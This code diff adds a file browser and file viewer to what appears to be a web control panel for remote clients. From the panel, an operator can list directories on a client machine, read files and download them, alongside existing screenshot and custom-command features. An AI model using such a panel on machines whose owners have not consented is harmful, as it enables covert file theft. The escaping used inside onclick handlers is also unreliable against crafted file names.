@@ -328,6 +328,45 @@
         </div>
     </div>
 
+    <!-- File Browser Modal -->
+    <div class="modal" id="fileBrowserModal">
+        <div class="modal-content" style="max-width: 1000px; max-height: 90vh;">
+            <h2>📁 File Browser</h2>
+
+            <div style="margin-bottom: 20px;">
+                <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 10px;">
+                    <button onclick="navigateToParent()" id="parentBtn" style="padding: 8px 12px;">⬆️ Parent</button>
+                    <input type="text" id="currentPath" readonly style="flex: 1; padding: 8px; background: #0d1117; border: 1px solid #30363d; border-radius: 5px; color: #c9d1d9;" />
+                    <button onclick="refreshFileList()" style="padding: 8px 12px;">🔄 Refresh</button>
+                </div>
+            </div>
+
+            <div id="fileList" style="max-height: 400px; overflow-y: auto; background: #0d1117; border: 1px solid #30363d; border-radius: 5px; padding: 10px;">
+                <div class="no-clients loading">Loading files...</div>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="button-secondary" onclick="closeFileBrowser()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- File Viewer Modal -->
+    <div class="modal" id="fileViewerModal">
+        <div class="modal-content" style="max-width: 900px; max-height: 90vh;">
+            <h2 id="fileViewerTitle">File Viewer</h2>
+
+            <div style="overflow: auto; max-height: calc(90vh - 150px); background: #0d1117; border: 1px solid #30363d; border-radius: 5px; padding: 15px;">
+                <pre id="fileContent" style="margin: 0; white-space: pre-wrap; word-wrap: break-word; font-family: 'Courier New', monospace; color: #c9d1d9;"></pre>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="button-secondary" onclick="closeFileViewer()">Close</button>
+                <button type="button" onclick="downloadCurrentFile()">💾 Download</button>
+            </div>
+        </div>
+    </div>
+
     <!-- Command Modal -->
     <div class="modal" id="commandModal">
         <div class="modal-content">
@@ -411,6 +450,9 @@
                                 </button>
                                 <button onclick="openPythonTemplatesModal('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
                                     🐍 Python
+                                </button>
+                                <button onclick="openFileBrowser('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
+                                    📁 Files
                                 </button>
                                 <button onclick="openCommandModal('${client.client_id}')" ${!client.is_online ? 'disabled' : ''}>
                                     💻 Custom
@@ -696,6 +738,270 @@ for item in sorted(os.listdir(cwd))[:50]:
             if (currentScreenshotFilename) {
                 window.open(`/api/screenshots/${currentScreenshotFilename}`, '_blank');
             }
+        }
+
+        // File Browser variables
+        let currentFileBrowserClientId = null;
+        let currentBrowserPath = null;
+        let currentParentPath = null;
+        let currentFileContent = null;
+        let currentFileName = null;
+
+        // Open file browser
+        async function openFileBrowser(clientId, startPath = null) {
+            currentFileBrowserClientId = clientId;
+            document.getElementById('fileBrowserModal').classList.add('active');
+
+            // Default to a common starting path if not specified
+            if (!startPath) {
+                // Try to get user's home or desktop first
+                startPath = 'C:\\Users\\jon89\\Desktop\\Formai';
+            }
+
+            await browseDirectory(startPath);
+        }
+
+        // Close file browser
+        function closeFileBrowser() {
+            document.getElementById('fileBrowserModal').classList.remove('active');
+            currentFileBrowserClientId = null;
+            currentBrowserPath = null;
+            currentParentPath = null;
+        }
+
+        // Browse directory
+        async function browseDirectory(path) {
+            if (!currentFileBrowserClientId) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentFileBrowserClientId,
+                        command: 'list_directory',
+                        params: { path: path }
+                    })
+                });
+
+                const result = await response.json();
+                const commandId = result.command_id;
+
+                // Poll for result
+                setTimeout(() => pollCommandResult(commandId, displayDirectoryListing), 1000);
+            } catch (error) {
+                alert('Failed to browse directory: ' + error.message);
+            }
+        }
+
+        // Refresh file list
+        function refreshFileList() {
+            if (currentBrowserPath) {
+                browseDirectory(currentBrowserPath);
+            }
+        }
+
+        // Navigate to parent directory
+        function navigateToParent() {
+            if (currentParentPath) {
+                browseDirectory(currentParentPath);
+            }
+        }
+
+        // Display directory listing
+        function displayDirectoryListing(result) {
+            if (result.status === 'error') {
+                document.getElementById('fileList').innerHTML = `<div class="no-clients" style="color: #ff3b3b;">Error: ${result.message}</div>`;
+                return;
+            }
+
+            currentBrowserPath = result.path;
+            currentParentPath = result.parent;
+            document.getElementById('currentPath').value = result.path;
+            document.getElementById('parentBtn').disabled = !result.parent;
+
+            const fileList = document.getElementById('fileList');
+
+            if (result.items.length === 0) {
+                fileList.innerHTML = '<div class="no-clients">Directory is empty</div>';
+                return;
+            }
+
+            fileList.innerHTML = result.items.map(item => {
+                const icon = item.is_dir ? '📁' : '📄';
+                const size = item.is_file ? formatFileSize(item.size) : '-';
+                const date = new Date(item.modified).toLocaleString();
+                const clickAction = item.is_dir
+                    ? `onclick="browseDirectory('${escapeHtml(item.path)}')"`
+                    : `onclick="viewFile('${escapeHtml(item.path)}', '${escapeHtml(item.name)}')"`;
+
+                return `
+                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid #30363d; cursor: pointer; transition: background 0.2s;"
+                         ${clickAction}
+                         onmouseover="this.style.background='#161b22'"
+                         onmouseout="this.style.background='transparent'">
+                        <div style="display: flex; align-items: center; gap: 10px; flex: 1;">
+                            <span style="font-size: 20px;">${icon}</span>
+                            <span style="font-weight: ${item.is_dir ? 'bold' : 'normal'};">${escapeHtml(item.name)}</span>
+                        </div>
+                        <div style="display: flex; gap: 20px; color: #aaa; font-size: 12px;">
+                            <span style="min-width: 80px; text-align: right;">${size}</span>
+                            <span style="min-width: 150px;">${date}</span>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // View file
+        async function viewFile(filePath, fileName) {
+            if (!currentFileBrowserClientId) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentFileBrowserClientId,
+                        command: 'read_file',
+                        params: { path: filePath }
+                    })
+                });
+
+                const result = await response.json();
+                const commandId = result.command_id;
+
+                currentFileName = fileName;
+
+                // Poll for result
+                setTimeout(() => pollCommandResult(commandId, displayFileContent), 1000);
+            } catch (error) {
+                alert('Failed to read file: ' + error.message);
+            }
+        }
+
+        // Display file content
+        function displayFileContent(result) {
+            if (result.status === 'error') {
+                alert('Error reading file: ' + result.message);
+                return;
+            }
+
+            currentFileContent = result;
+            document.getElementById('fileViewerTitle').textContent = `File: ${currentFileName}`;
+
+            if (result.encoding === 'text') {
+                document.getElementById('fileContent').textContent = result.content;
+            } else {
+                document.getElementById('fileContent').textContent = '[Binary file - cannot display as text]\n\nSize: ' + formatFileSize(result.size) + '\nEncoding: ' + result.encoding;
+            }
+
+            document.getElementById('fileViewerModal').classList.add('active');
+        }
+
+        // Close file viewer
+        function closeFileViewer() {
+            document.getElementById('fileViewerModal').classList.remove('active');
+            currentFileContent = null;
+            currentFileName = null;
+        }
+
+        // Download current file
+        async function downloadCurrentFile() {
+            if (!currentFileContent || !currentFileBrowserClientId) return;
+
+            try {
+                const response = await fetch('/api/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        client_id: currentFileBrowserClientId,
+                        command: 'download_file',
+                        params: { path: currentFileContent.path }
+                    })
+                });
+
+                const result = await response.json();
+                const commandId = result.command_id;
+
+                // Poll for result
+                setTimeout(() => pollCommandResult(commandId, handleFileDownload), 1000);
+            } catch (error) {
+                alert('Failed to download file: ' + error.message);
+            }
+        }
+
+        // Handle file download
+        function handleFileDownload(result) {
+            if (result.status === 'error') {
+                alert('Error downloading file: ' + result.message);
+                return;
+            }
+
+            // Convert base64 to blob and trigger download
+            const byteCharacters = atob(result.content);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+                byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray]);
+
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = result.filename;
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+
+            alert('File downloaded: ' + result.filename);
+        }
+
+        // Poll for command result
+        function pollCommandResult(commandId, callback, attempts = 0) {
+            if (attempts >= 20) {
+                alert('Timeout waiting for command result');
+                return;
+            }
+
+            fetch(`/api/command_results/${commandId}`)
+                .then(response => {
+                    if (response.status === 404) {
+                        // Result not ready yet, poll again
+                        setTimeout(() => pollCommandResult(commandId, callback, attempts + 1), 500);
+                    } else {
+                        return response.json().then(data => {
+                            callback(data.result);
+                        });
+                    }
+                })
+                .catch(error => {
+                    setTimeout(() => pollCommandResult(commandId, callback, attempts + 1), 500);
+                });
+        }
+
+        // Format file size
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 B';
+            const k = 1024;
+            const sizes = ['B', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
+        }
+
+        // Escape HTML
+        function escapeHtml(text) {
+            const map = {
+                '&': '&amp;',
+                '<': '&lt;',
+                '>': '&gt;',
+                '"': '&quot;',
+                "'": '&#039;',
+                '\\': '\\\\'
+            };
+            return text.replace(/[&<>"'\\]/g, m => map[m]);
         }
 
         // Auto-refresh data
